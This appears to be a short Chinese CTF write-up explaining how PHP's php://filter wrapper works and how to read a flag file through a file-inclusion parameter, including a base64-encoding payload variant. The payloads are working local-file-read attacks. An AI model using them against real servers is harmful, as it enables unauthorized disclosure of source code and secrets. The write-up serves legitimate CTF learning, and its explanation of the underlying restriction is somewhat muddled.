# 读取源代码php://filter

**原理:**

针对PHP的`GET 或者 POST的请求路径的开头大小做了限制`,  那么只要通过某个中间流来绕过这种大小, 长度的限制就可以了

`php://filter`可以作为中间流, 来处理其他的流, 具体如下:

| php://filter的四个参数    |                                                              |
| ------------------------- | ------------------------------------------------------------ |
| 称                        | 描述                                                         |
| resource=<要过滤的数据流> | 指定了你要筛选过滤的数据流。                                 |
| read=<读链的筛选列表>     | 可以设定一个或多个过滤器名称，以管道符分隔                   |
| write=<写链的筛选列表>    | 可以设定一个或多个过滤器名称，以管道符分隔                   |
| <；两个链的筛选列表>      | 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 |
|                           |                                                              |
|                           |                                                              |

**步骤:** 

直接改包就可以了

`/?file=php://filter/resource=/flag`

![image-20230406115059683](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230406115059683.png)

完成啦!



补充: 官网上说针对base64输出的, 可以用下面这种payload

```
/?file=php://filter/read=convert.base64-encode/resource=/flag
```

